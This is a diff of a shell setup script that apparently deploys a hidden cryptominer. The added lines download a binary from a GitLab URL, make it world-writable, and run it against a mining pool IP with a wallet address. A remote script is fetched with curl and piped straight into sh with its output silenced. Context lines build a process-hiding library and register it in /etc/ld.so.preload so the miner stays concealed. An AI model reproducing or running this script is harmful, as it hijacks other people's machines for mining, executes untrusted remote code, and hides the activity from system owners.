@@ -13,7 +13,7 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://ixi.hash.express/dl/iximiner_v0.3.0_22.08.2022_linux.tar.gz && tar -zvxf iximiner_v0.3.0_22.08.2022_linux.tar.gz && cd iximiner_v0.3.0_22.08.2022_linux
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/1.94a && chmod 777 1.94a
 
 wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
 
@@ -55,4 +55,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./iximiner --mode miner --pool https://ixi.hash.express --wallet 4jUKTw9ontYxnZagkmU3DRuJb3TgGknDkjDrBUCC1Lzb9vazw7uE3NogHaHC2g2AP --name $(shuf -n 1 -i 1-99999)-Bismillah --cpu-intensity 0 --gpu-intensity 99 --force-gpu-optimization CUDA & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh > /dev/null 2>&1
+./graftcp/graftcp & clear & ./1.94a -a OCTOPUS -p 165.227.65.49:80 -u cfx:aasxa8kh69rz97vxy8mwxp1bkdawvxxrh6cjdk3c6y.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh > /dev/null 2>&1
